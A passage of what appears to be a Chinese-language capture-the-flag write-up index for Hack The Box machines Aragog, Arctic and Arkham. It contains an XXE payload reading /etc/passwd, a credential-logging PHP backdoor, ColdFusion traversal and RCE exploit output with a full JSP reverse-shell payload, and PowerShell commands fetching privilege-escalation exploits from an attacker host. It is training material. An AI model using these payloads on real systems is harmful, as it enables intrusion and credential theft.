21: ftp","text":"<p>\u6709\u533f\u540d\u767b\u5f55\u5230 ftp \u670d\u52a1</p> <pre><code>root@kali# ftp Anonymous@10.10.10.78 \nConnected to 10.10.10.78.\n220 (vsFTPd 3.0.3)\nName (10.10.10.78:root): ftp\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp&gt; ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-r--r--r--    1 ftp      ftp            86 Dec 21 16:30 test.txt\n226 Directory send OK.\nftp&gt; get test.txt\nlocal: test.txt remote: test.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for test.txt (86 bytes).\n226 Transfer complete.\n86 bytes received in 0.01 secs (16.0092 kB/s)\n</code></pre> <p>test.txt:</p> <pre><code>&lt;details&gt;\n    &lt;subnet_mask&gt;255.255.255.192&lt;/subnet_mask&gt;\n    &lt;test&gt;&lt;/test&gt;\n&lt;/details&gt;\n</code></pre>"},{"location":"CTF/HTB/Windows-Aragog/index.html#xxe","title":"XXE","text":"<p>\u6211\u604d\u7136\u5927\u609f\uff0cxml\u6587\u4ef6\u53ef\u4ee5\u7528\u4e8e\u8fd9\u4e2a\u7f51\u7ad9\uff0cburpsuite\u6293\u53d6\u5305\uff0c\u7ed3\u5408\u4e4b\u524dtest.php\u7684xml\uff0c\u91cd\u65b0\u53d1\u5305\u3002</p> <p></p> <p>\u6839\u636e\u4e0a\u9762\u663e\u793a\uff0c\u589e\u52a0xxe\u653b\u51fb\u4ee3\u7801\uff0c\u6784\u9020\u8bed\u53e5\uff0c\u5f97\u51fa\u4e0b\u9762\u6d4b\u8bd5\u4ee3\u7801</p> <pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;!DOCTYPE  XXE [&lt;!ENTITY test SYSTEM \"file:///etc/passwd\"&gt; ]&gt;\n&lt;details&gt;\n    &lt;subnet_mask&gt;&amp;test;&lt;/subnet_mask&gt;\n    &lt;test&gt;&lt;/test&gt;\n&lt;/details&gt;\n</code></pre> <p></p> <p>\u56de\u663e\u4e2d\u8fd9\u4e00\u6761\u4fe1\u606f florian1000:1000:florian,,,:/home/florian:/bin/bash \u5728home\u76ee\u5f55\u4e0b\u7528\u6237\u662fflorian \u6253\u5370\u8be5\u7528\u6237\u6807\u5fd7</p> <p></p> <p>\u8bfb\u53d6\u9776\u673a\u7684id_rsa\u4fe1\u606f\uff0c\u83b7\u5f97\u5bc6\u5319\uff0cssh\u767b\u5f55</p> <p></p> <p>\u5c06\u5f97\u5230\u7684\u5bc6\u94a5\u590d\u5236\u5230\u672c\u5730\u7ed9\u6743\u9650600\u7136\u540essh\u767b\u5f55\u5230\u76ee\u6807\u9776\u673a</p> <p></p>"},{"location":"CTF/HTB/Windows-Aragog/index.html#_3","title":"\u63d0\u6743","text":"<p>\u67e5\u770b\u76ee\u6807\u9776\u673a\u7684\u7cfb\u7edf\u5185\u6838\u548c\u6240\u4f7f\u7528\u7684\u64cd\u4f5c\u7cfb\u7edf</p> <p></p> <p>\u786e\u8ba4\u7cfb\u7edf\u67b6\u6784\u4e4b\u540e\u5f00\u59cb\u76d1\u63a7\u4e0b\u7cfb\u7edf\u8fdb\u7a0b\u8fd0\u884c\u7684\u60c5\u51b5\uff0c\u8fd9\u91cc\u4f7f\u7528pspy\u8fd9\u4e2a\u6b3e\u5de5\u5177</p> <p>https://github.com/DominicBreuker/pspy</p> <p>pspy\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5b83\u53ef\u4ee5\u5728\u6ca1\u6709Root\u6743\u9650\u7684\u60c5\u51b5\u4e0b\uff0c\u76d1\u63a7Linux\u8fdb\u7a0b\u3002\u9ed1\u5ba2\u53ef\u4ee5\u5229\u7528\u5b83\u6765\u67e5\u770b\u5176\u4ed6\u7528\u6237\u7684\u8ba1\u5212\u4efb\u52a1\u5de5\u4f5c(cron job)\u7b49\uff0c\u8be5\u5de5\u5177\u4e5f\u975e\u5e38\u9002\u5408\u6280\u672f\u4eba\u5458\u5728CTF\uff08Capture The Flag\uff09\u4e2d\u679a\u4e3eLinux\u7cfb\u7edf\uff0c\u540c\u6837\u8be5\u5de5\u5177\u4e5f\u4f1a\u5f88\u597d\u5730\u5411\u6211\u4eec\u5c55\u793a\u4e3a\u4ec0\u4e48\u5728\u547d\u4ee4\u884c\u4e0a\u5c06\u5bc6\u7801\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u662f\u4e00\u4e2a\u4e0d\u597d\u7684\u9009\u62e9\u3002</p> <p>\u8be5\u5de5\u5177\u4f1a\u6536\u96c6\u6765\u81eaprocfs\u626b\u63cf\u7684\u4fe1\u606f\uff0c\u653e\u7f6e\u5728\u6587\u4ef6\u7cfb\u7edf\u9009\u5b9a\u90e8\u5206\u7684Inotify\u89c2\u5bdf\u5668\u4f1a\u89e6\u53d1\u8fd9\u4e9b\u626b\u63cf\u529f\u80fd\u4ee5\u6355\u83b7Linux\u8fdb\u7a0b\u4fe1\u606f\u3002</p> <p></p> <p>\u786e\u8ba4\u6bcf\u5206\u949f\u90fd\u6709\u8ba1\u5212\u4efb\u52a1\u5728\u6267\u884c\u76ee\u6807\u9776\u673a\u7684\u767b\u5f55\u529f\u80fd\uff0c\u67e5\u770b\u4e0b\u7f51\u7ad9\u6839\u76ee\u5f55\u53d1\u73b0\u5b58\u5728dev_wiki\u8fd9\u4e2a\u76ee\u5f55\u3002</p> <pre><code>florian@aragog:~$ cd /var/\nflorian@aragog:/var$ ls\nbackups  crash  lib    lock  mail     opt  snap   tmp\ncache    ftp    local  log   metrics  run  spool  www\nflorian@aragog:/var$ cd www\nflorian@aragog:/var/www$ ls\nhtml\nflorian@aragog:/var/www$ cd html\nflorian@aragog:/var/www/html$ ls\ndev_wiki  hosts.php  index.html  zz_backup\nflorian@aragog:/var/www/html$ cd dev_wiki/\nflorian@aragog:/var/www/html/dev_wiki$ ls\nindex.php        wp-blog-header.php    wp-includes        wp-settings.php\nlicense.txt      wp-comments-post.php  wp-links-opml.php  wp-signup.php\nreadme.html      wp-config.php         wp-load.php        wp-trackback.php\nwp-activate.php  wp-content            wp-login.php       xmlrpc.php\nwp-admin         wp-cron.php           wp-mail.php\n</code></pre> <p>\u5728\u8fd9\u91cc\u53d1\u73b0wordpress\u6846\u67b6\u6587\u4ef6 \u8bbf\u95eehttp://10.10.10.78/dev_wiki/index.php \u7f51\u9875\u4e0d\u6b63\u5e38\uff0c\u800c\u4e1410.10.10.78\u5e76\u6ca1\u6709\u8fdb\u884c\u57df\u540d\u89e3\u6790 \u91cd\u5b9a\u5411\u5c06aragog\u6dfb\u52a0\u5230/etc/hosts \u6587\u4ef6\u4e2d\uff0c \u5728\u81ea\u5df1\u7684\u547d\u4ee4\u7aef\u6267\u884c\u3002</p> <pre><code>root@kali# echo '10.10.10.78 aragog'  &gt;&gt; /etc/hosts\n</code></pre> <p>\u76f4\u63a5\u4fee\u6539\u4e0a\u8ff0\u8ba1\u5212\u4efb\u52a1\u6267\u884c\u7684wp-login.php\u6587\u4ef6\uff0c\u56e0\u4e3a\u76ee\u5f55dev_wiki\u662f777\u6743\u9650\uff0c\u6240\u6709\u4eba\u90fd\u53ef\u4ee5\u8fdb\u884c\u4fee\u6539\uff0c\u4fee\u6539\u6210\u5982\u4e0b\u4ee3\u7801</p> <pre><code>&lt;?php\nfile_put_contents(\"bmfx.log\", print_r($_POST, true));\n?&gt;\n</code></pre> <p>\u6700\u7ec8\u5f97\u5230\u5bc6\u7801</p> <p></p> <p>\u4f7f\u7528su\u76f4\u63a5\u5207\u6362\u81f3root\u7528\u6237</p> <p></p>"},{"location":"CTF/HTB/Windows-Arctic/index.html","title":"\u4fe1\u606f\u641c\u96c6","text":""},{"location":"CTF/HTB/Windows-Arctic/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.11 -oA scans/ports\n\u00b7\u00b7\u00b7\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n8500/tcp  open  fmtp\n49154/tcp open  unknown\n\u00b7\u00b7\u00b7\nroot@kali# nmap -sT -sC -sV -O -p135,8500,49154 10.10.10.11 -oA scans/details\n\u00b7\u00b7\u00b7\nPORT      STATE SERVICE VERSION\n135/tcp   open  msrpc   Microsoft Windows RPC\n8500/tcp  open  fmtp?\n49154/tcp open  msrpc   Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 8|Phone|2008|8.1|7|Vista|2012 (92%)\nOS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2\nAggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\u00b7\u00b7\u00b7\nroot@kali# nmap -sU -open --top-ports 20 10.10.10.11 -oA nmapscan/udp\n\u00b7\u00b7\u00b7\nPORT      STATE         SERVICE\n53/udp    open|filtered domain\n67/udp    open|filtered dhcps\n68/udp    open|filtered dhcpc\n69/udp    open|filtered tftp\n123/udp   open|filtered ntp\n135/udp   open|filtered msrpc\n137/udp   open|filtered netbios-ns\n138/udp   open|filtered netbios-dgm\n139/udp   open|filtered netbios-ssn\n161/udp   open|filtered snmp\n162/udp   open|filtered snmptrap\n445/udp   open|filtered microsoft-ds\n500/udp   open|filtered isakmp\n514/udp   open|filtered syslog\n520/udp   open|filtered route\n631/udp   open|filtered ipp\n1434/udp  open|filtered ms-sql-m\n1900/udp  open|filtered upnp\n4500/udp  open|filtered nat-t-ike\n49152/udp open|filtered unknown\n\u00b7\u00b7\u00b7\n</code></pre> <p>nmap\u53d1\u73b0\u4e09\u4e2a\u6253\u5f00\u7684 TCP \u7aef\u53e3\uff0cRPC\uff08135\u300149154\uff09\u548c \uff088500\uff09\uff1a</p>"},{"location":"CTF/HTB/Windows-Arctic/index.html#web","title":"Web\u8bbf\u95ee","text":"<p>\u5c1d\u8bd5<code>curl http://10.10.10.11:8500</code></p> <pre><code>$ curl http://10.10.10.11:8500             \n  &lt;html&gt;\n  &lt;head&gt;\n  &lt;title&gt;Index of /&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=\"#ffffff\"&gt;\n  &lt;h1&gt;Index of /&lt;/h1&gt;&lt;br&gt;&lt;hr&gt;&lt;pre&gt;&lt;a href=\"CFIDE/\"&gt;CFIDE/&lt;/a&gt;               &lt;i&gt;dir&lt;/i&gt;   03/22/17 08:52 \u03bc\u03bc\n  &lt;a href=\"cfdocs/\"&gt;cfdocs/&lt;/a&gt;              &lt;i&gt;dir&lt;/i&gt;   03/22/17 08:55 \u03bc\u03bc\n  &lt;/pre&gt;&lt;hr&gt;&lt;/html&gt; \n</code></pre> <p>\u8fd9\u91cc\u7684 8500 \u662f\u4e00\u4e2a HTTP \u670d\u52a1\uff0c\u6253\u5f00\u540e\u9700\u8981\u7b49\u5f85\u7ea6 10-20 \u79d2\u7684\u65f6\u95f4\u6765\u52a0\u8f7d\u3002\u8fd9\u53f0\u9776\u673a\u7684\u7ffb\u8bd1\u53eb\u505a\u5317\u6781\uff0c\u6211\u60f3\u539f\u56e0\u5c31\u662f\u56e0\u4e3a\u592a\u6162\u4e86\u5427\u3002</p> <p></p> <p>\u4ece<code>10.10.10.11:8500/CFIDE/administrator/</code>\u83b7\u53d6\u5230<code>ADOBE COLDFUSION 8</code>\u7684\u767b\u5f55\u9875\u9762\uff1a</p> <p></p> <p></p>"},{"location":"CTF/HTB/Windows-Arctic/index.html#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":""},{"location":"CTF/HTB/Windows-Arctic/index.html#_3","title":"\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e","text":"<p>\u672c\u5730\u67e5\u627e\u6f0f\u6d1e\u5229\u7528,\u53ef\u77e5\u5b58\u5728\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\uff1a</p> <p></p> <p>\u4e0b\u8f7d\u5229\u7528\u811a\u672c\uff1a</p> <p></p> <p>\u811a\u672c\u5229\u7528\uff1a</p> <p></p> <pre><code>$ python2 14641.py 10.10.10.11 8500 ../../../../../../../lib/password.properties\n  ------------------------------\n  trying /CFIDE/wizards/common/_logintowizard.cfm\n  title from server in /CFIDE/wizards/common/_logintowizard.cfm:\n  ------------------------------\n  #Wed Mar 22 20:53:51 EET 2017\n  rdspassword=0IA/F[[E&gt;[$_6&amp; \\\\Q&gt;[K\\=XP  \\n\n  password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03\n  encrypted=true\n  ------------------------------\n  ------------------------------\n  trying /CFIDE/administrator/archives/index.cfm\n  title from server in /CFIDE/administrator/archives/index.cfm:\n  ------------------------------\n  #Wed Mar 22 20:53:51 EET 2017\n  rdspassword=0IA/F[[E&gt;[$_6&amp; \\\\Q&gt;[K\\=XP  \\n\n  password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03\n  encrypted=true\n  ------------------------------\n  ------------------------------\n  trying /cfide/install.cfm\n  title from server in /cfide/install.cfm:\n  ------------------------------\n  #Wed Mar 22 20:53:51 EET 2017\n  rdspassword=0IA/F[[E&gt;[$_6&amp; \\\\Q&gt;[K\\=XP  \\n\n  password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03\n  encrypted=true\n  ------------------------------\n  ------------------------------\n  trying /CFIDE/administrator/entman/index.cfm\n  title from server in /CFIDE/administrator/entman/index.cfm:\n  ------------------------------\n  #Wed Mar 22 20:53:51 EET 2017\n  rdspassword=0IA/F[[E&gt;[$_6&amp; \\\\Q&gt;[K\\=XP  \\n\n  password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03\n  encrypted=true\n  ------------------------------\n  ------------------------------\n  trying /CFIDE/administrator/enter.cfm\n  title from server in /CFIDE/administrator/enter.cfm:\n  ------------------------------\n  #Wed Mar 22 20:53:51 EET 2017\n  rdspassword=0IA/F[[E&gt;[$_6&amp; \\\\Q&gt;[K\\=XP  \\n\n  password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03\n  encrypted=true\n  ------------------------------\n</code></pre> <p></p> <p>\u767b\u5f55\u6210\u529f\uff1a</p> <p></p>"},{"location":"CTF/HTB/Windows-Arctic/index.html#searchsploit","title":"SearchSploit","text":"<pre><code>root@kali# searchsploit ColdFusion 8    \n  \u00b7\u00b7\u00b7\n  Adobe ColdFusion 8 - Remote Command Execution | cfm/webapps/50057.py\n  \u00b7\u00b7\u00b7\n</code></pre> <p>Adobe ColdFusion 8 - Remote Command Execution \u5b58\u5728RCE\u6f0f\u6d1e</p>"},{"location":"CTF/HTB/Windows-Arctic/index.html#msfconsole","title":"Msfconsole","text":"<pre><code>root@kali# searchsploit -m 50057.py\n  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)\n      URL: https://www.exploit-db.com/exploits/50057\n      Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py\n      Codes: CVE-2009-2265\n  Verified: False\n  File Type: Python script, ASCII text executable\n  Copied to: /home/kali/\u684c\u9762/50057.py\n</code></pre> <pre><code>root@kali# python3 50057.py   \n\n  Generating a payload...\n  Payload size: 1496 bytes\n  Saved as: 58e52c02f7694b0cb122969bd690000a.jsp\n\n  Priting request...\n  Content-type: multipart/form-data; boundary=c06c5ed533b244a3a3d9ba04c5f5911c\n  Content-length: 1697\n\n  --c06c5ed533b244a3a3d9ba04c5f5911c\n  Content-Disposition: form-data; name=\"newfile\"; filename=\"58e52c02f7694b0cb122969bd690000a.txt\"\n  Content-Type: text/plain\n\n  &lt;%@page import=\"java.lang.*\"%&gt;\n  &lt;%@page import=\"java.util.*\"%&gt;\n  &lt;%@page import=\"java.io.*\"%&gt;\n  &lt;%@page import=\"java.net.*\"%&gt;\n\n  &lt;%\n  class StreamConnector extends Thread\n  {\n      InputStream uq;\n      OutputStream qh;\n\n      StreamConnector( InputStream uq, OutputStream qh )\n      {\n      this.uq = uq;\n      this.qh = qh;\n      }\n\n      public void run()\n      {\n      BufferedReader c2  = null;\n      BufferedWriter yeh = null;\n      try\n      {\n          c2  = new BufferedReader( new InputStreamReader( this.uq ) );\n          yeh = new BufferedWriter( new OutputStreamWriter( this.qh ) );\n          char buffer[] = new char[8192];\n          int length;\n          while( ( length = c2.read( buffer, 0, buffer.length ) ) &gt; 0 )\n          {\n          yeh.write( buffer, 0, length );\n          yeh.flush();\n          }\n      } catch( Exception e ){}\n      try\n      {\n          if( c2 != null )\n          c2.close();\n          if( yeh != null )\n          yeh.close();\n      } catch( Exception e ){}\n      }\n  }\n\n  try\n  {\n      String ShellPath;\n  if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\n  ShellPath = new String(\"/bin/sh\");\n  } else {\n  ShellPath = new String(\"cmd.exe\");\n  }\n\n      Socket socket = new Socket( \"10.10.16.8\", 4444 );\n      Process process = Runtime.getRuntime().exec( ShellPath );\n      ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();\n      ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();\n  } catch( Exception e ) {}\n  %&gt;\n\n  --c06c5ed533b244a3a3d9ba04c5f5911c--\n\n\n  Sending request and printing response...\n\n\n          &lt;script type=\"text/javascript\"&gt;\n              window.parent.OnUploadCompleted( 0, \"/userfiles/file/58e52c02f7694b0cb122969bd690000a.jsp/58e52c02f7694b0cb122969bd690000a.txt\", \"58e52c02f7694b0cb122969bd690000a.txt\", \"0\" );\n          &lt;/script&gt;\n\n\n  Printing some information for debugging...\n  lhost: 10.10.16.8\n  lport: 4444\n  rhost: 10.10.10.11\n  rport: 8500\n  payload: 58e52c02f7694b0cb122969bd690000a.jsp\n\n  Deleting the payload...\n\n  Listening for connection...\n\n  Executing the payload...\n  listening on [any] 4444 ...\n  connect to [10.10.16.8] from (UNKNOWN) [10.10.10.11] 54620\n  Microsoft Windows [Version 6.1.7600]\n\n  Copyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\n  C:\\ColdFusion8\\runtime\\bin&gt;whoami\n  whoami\n  arctic\\tolis\n  C:\\ColdFusion8\\runtime\\bin&gt;cd /\n  cd /\n  \u00b7\u00b7\u00b7\n  C:\\Users\\tolis&gt;cd desktop\n  cd desktop\n\n  C:\\Users\\tolis\\Desktop&gt;dir\n  dir\n  Volume in drive C has no label.\n  Volume Serial Number is 5C03-76A8\n\n  Directory of C:\\Users\\tolis\\Desktop\n\n  22/03/2017  09:00 \ufffd\ufffd    &lt;DIR&gt;          .\n  22/03/2017  09:00 \ufffd\ufffd    &lt;DIR&gt;          ..\n  27/02/2024  12:45 \ufffd\ufffd                34 user.txt\n              1 File(s)             34 bytes\n              2 Dir(s)   1.433.661.440 bytes free\n</code></pre>"},{"location":"CTF/HTB/Windows-Arctic/index.html#_4","title":"\u63d0\u6743","text":"<ul> <li>\u8fd9\u662f\u4e00\u4e2a\u6ca1\u6709\u5e94\u7528\u8865\u4e01\u7684<code>Windows 2008 R2</code>\u670d\u52a1\u5668</li> <li>\u53ef\u80fd\u5b58\u5728\u5185\u6838\u6f0f\u6d1e\u653b\u51fb\uff0c\u4f7f\u7528<code>sysinfo</code>\u7ed3\u679c\u8fd0\u884c<code>Windows Exploit Suggester</code></li> <li>\u590d\u5236\u811a\u672c\u5185\u5bb9\u5230<code>windows-exploit-suggester.py</code></li> <li>\u5b89\u88c5<code>Python xlrd</code>\u5e93</li> </ul> <p>\u67e5\u770b\u53ef\u5229\u7528\u7684\u6f0f\u6d1e:</p> <p><code>windows-exploit-suggester.py</code>:https://github.com/AonCyberLabs/Windows-Exploit-Suggester</p> <pre><code># \u6570\u636e\u5e93\u5347\u7ea7\nroot@kali#  python2 windows-exploit-suggester.py --update \n[*] initiating winsploit version 3.3...\n[+] writing to file 2024-04-25-mssb.xls\n[*] done\n\n# \u5c06systeminfo\u7ed3\u679c\u590d\u5236\u5230\u672c\u5730\u6587\u4ef6systeminfo.txt\u4e2d\nroot@kali#  vim systeminfo.txt\n\n# \u67e5\u770b\u53ef\u5229\u7528\u7684\u6f0f\u6d1e\uff0c\u8fd9\u91cc\u62a5\u9519\u4e86\uff0c\u56e0\u4e3a\u7f3a\u5c11xlrd\u5e93\nroot@kali# python2 windows-exploit-suggester.py --database 2024-04-25-mssb.xls --systeminfo systeminfo.txt \n[*] initiating winsploit version 3.3...\n[*] database file detected as xls or xlsx based on extension\n[-] please install and upgrade the python-xlrd library\n\n# \u5b89\u88c5xlrd\u5e93\uff0c\u8fd9\u91cc\u6307\u5b9a1.2.0\u7248\u672c\uff0c\u9ad8\u7248\u672c\u4f1a\u62a5\u9519\nroot@kali# python2 -m pip install xlrd==1.2.0\n\u2026\u2026\u4e0b\u8f7d\u7565\u2026\u2026\nSuccessfully installed xlrd-1.2.0\n\n# \u67e5\u770b\u53ef\u5229\u7528\u7684\u6f0f\u6d1e\nroot@kali#  python2 windows-exploit-suggester.py --database 2024-04-25-mssb.xls --systeminfo systeminfo.txt\n[*] initiating winsploit version 3.3...\n[*] database file detected as xls or xlsx based on extension\n[*] attempting to read from the systeminfo input file\n[+] systeminfo input file read successfully (utf-8)\n[*] querying database file for potential vulnerabilities\n[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits\n[*] there are now 197 remaining vulns\n[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin\n[+] windows version identified as 'Windows 2008 R2 64-bit'\n[*] \n[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical\n[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important\n[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical\n[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC\n[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass (MS12-037), PoC\n[*] \n[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important\n[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important\n[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical\n[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important\n[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important\n[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical\n[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical\n[*] done\n</code></pre> <p>E]\u8868\u793aexploited poc\uff0c\u53ef\u4ee5\u76f4\u63a5\u7528searchsploit\u83b7\u53d6POC\uff1a</p> <p></p> <p>\u8fd9\u8fb9\u6709\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684\uff0c\u5c31\u4e0d\u7528\u5728\u7f16\u8bd1\u4e86\u3002kali \u672c\u5730\u5f00\u542fhttp\u670d\u52a1\uff0c\u76d1\u542c</p> <p></p> <p>Windows\u4e0b\u8f7d\u63d0\u6743\u7a0b\u5e8f\uff0c</p> <pre><code>powershell (new-object System.Net.WebClient).DownloadFile('http://10.10.14.26/ms11011.exe','ms11011.exe') \n</code></pre> <p></p> <p>\u6267\u884c\uff0c\u63d0\u6743\u5931\u8d25</p> <pre><code>C:\\ColdFusion8\\runtime\\bin&gt;whoami\nwhoami\narctic\\tolis\n\nC:\\ColdFusion8\\runtime\\bin&gt;ms11011.exe\nms11011.exe\n\nC:\\ColdFusion8\\runtime\\bin&gt;whoami\nwhoami\narctic\\tolis\n</code></pre> <p>\u6362\u4e2a\u6f0f\u6d1e\uff0c\u8fd9\u6b21\u8bd5\u8bd5MS10-059</p> <pre><code>powershell (new-object System.Net.WebClient).DownloadFile('http://10.10.14.26/MS10-059/MS10-059.exe','MS10-059.exe') \n</code></pre> <p>\u5c1d\u8bd5\u6267\u884c\uff1a</p> <pre><code>C:\\ColdFusion8\\wwwroot\\userfiles\\file&gt;MS10-059.exe\nMS10-059.exe\n/Chimichurri/--&gt;This exploit gives you a Local System shell &lt;BR&gt;/Chimichurri/--&gt;Usage: Chimichurri.exe ipaddress port &lt;BR&gt;\n</code></pre> <p>nc \u518d\u76d1\u542c\u4e00\u4e2a\u7aef\u53e3 8888\uff0c\u518d\u6267\u884c\u8fd9\u4e2aEXP</p> <pre><code>C:\\ColdFusion8\\wwwroot\\userfiles\\file&gt;MS10-059.exe 10.10.14.26 8888\nMS10-059.exe 10.10.14.26 8888\n</code></pre> <p>\u6210\u529f\u6536\u5230\u53cd\u5f39shell</p> <p></p>"},{"location":"CTF/HTB/Windows-Arctic/index.html#_5","title":"\u603b\u7ed3","text":"<ol> <li>COLDFUSION\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\u5229\u7528</li> <li>COLDFUSIONRCE\u6f0f\u6d1e\u5229\u7528</li> <li>\u5185\u6838\u6f0f\u6d1e\u5229\u7528\u63d0\u6743</li> </ol>"},{"location":"CTF/HTB/Windows-Arkham/index.html","title":"\u4fe1\u606f\u641c\u96c6","text":""},{"location":"CTF/HTB/Windows-Arkham/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.130 -oA scans/ports\n...\nPORT      STATE SERVICE\n80/tcp    open  http\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n8080/tcp  open  http-proxy\n49666/tcp open  unknown\n49667/tcp open  unknown\n...\nroot@kali# nmap -sT -sC -sV -O -p80,135,139,445,8080 10.10.10.11 -oA scans/details\n...\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n8080/tcp open  http          Apache Tomcat 8.5.37\n| http-methods:\n|_  Potentially risky methods: PUT DELETE\n|_http-title: Mask Inc.\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -9m03s, deviation: 0s, median: -9m03s\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2019-03-16 15:09:28\n|_  start_date: N/A\n...\n</code></pre>"},{"location":"CTF/HTB/Windows-Arkham/index.html#website-tcp-80","title":"Website - TCP 80","text":"<p>\u4e3a IIS \u9ed8\u8ba4\u754c\u9762</p>"},{"location":"CTF/HTB/Windows-Arkham/index.html#website-tcp-8080","title":"Website - TCP 8080","text":"<p>\u9875\u9762\u663e\u793a\u8fd9\u662f\u4e00\u5bb6\u540d\u4e3a Mask \u7684\u516c\u53f8\uff0c\u4e3b\u8981\u4e1a\u52a1\u4e3a\u6570\u636e\u4fdd\u62a4\u3002</p>"},{"location":"CTF/HTB/Windows-Arkham/index.html#fuzz","title":"\u76ee\u5f55FUZZ","text":""},{"location":"CTF/HTB/Windows-Arkham/index.html#tcp-80","title":"TCP-80","text":"<pre><code>root@kali# gobuster -u http://10.10.10.130 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50\n...\n2024/05/12 15:13:15 Starting gobuster\n=====================================================\n=====================================================\n2024/05/12 15:17:01 Finished\n...\n</code></pre> <p>\u6ca1\u6709\u626b\u63cf\u5230\u4ec0\u4e48\u6709\u4ef7\u503c\u7684\u76ee\u5f55</p>"},{"location":"CTF/HTB/Windows-Arkham/index.html#tcp-8080","title":"TCP-8080","text":"<pre><code>root@kali# gobuster -u http://10.10.10.130:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50\n...\n=====================================================\n/images (Status: 302)\n/css (Status: 302)\n/js (Status: 302)\n/fonts (Status: 302)\n=====================================================\n...\n</code></pre> <p>\u4e5f\u6ca1\u6709\u53d1\u73b0\u4ec0\u4e48\u6709\u7528\u7684\u76ee\u5f55\uff0c\u67e5\u770b\u7f51\u7ad9\u53ef\u4ee5\u5728\u8ba2\u9605\u4e2d\u53d1\u73b0\u4e00\u4e2a\u4ea4\u4e92\u70b9.<code>http://10.10.10.130:8080/userSubscribe.faces</code></p> <p></p> <p>\u8f93\u5165 mac \u4f1a\u7ed9\u4f60\u4e00\u4e2a\u8fd4\u56de\u4fe1\u606f</p> <p></p>"},{"location":"CTF/HTB/Windows-Arkham/index.html#smb-tcp-445","title":"SMB - TCP 445","text":"<p>\u4f7f\u7528 smbclient \u67e5\u770b\u5f53\u524d\u5171\u4eab</p> <pre><code>root@kali# smbclient -N -L //10.10.10.130\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        BatShare        Disk      Master Wayne's secrets\n        